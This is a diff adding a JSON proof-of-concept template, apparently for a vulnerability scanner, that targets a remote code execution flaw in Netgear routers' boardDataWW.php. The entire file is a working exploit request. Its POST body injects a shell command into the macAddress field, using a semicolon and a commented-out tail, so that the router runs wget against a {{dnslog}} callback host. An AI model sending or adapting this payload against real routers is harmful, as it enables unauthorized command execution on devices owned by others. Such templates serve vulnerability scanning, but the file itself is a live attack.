@@ -1,0 +1,15 @@
+{
+	"name":"Netgear路由器boardDataWW.phpRCE",
+	"tag":"Netgear",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/boardDataWW.php",
+		"pocPost":"macAddress=112233445566%3Bwget+http%3A%2F%2F{{dnslog}}%23&reginfo=0&writeData=Submit",
+		"header":{
+			"Accept":" */*",
+			"Content-Type":" application/x-www-form-urlencoded"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
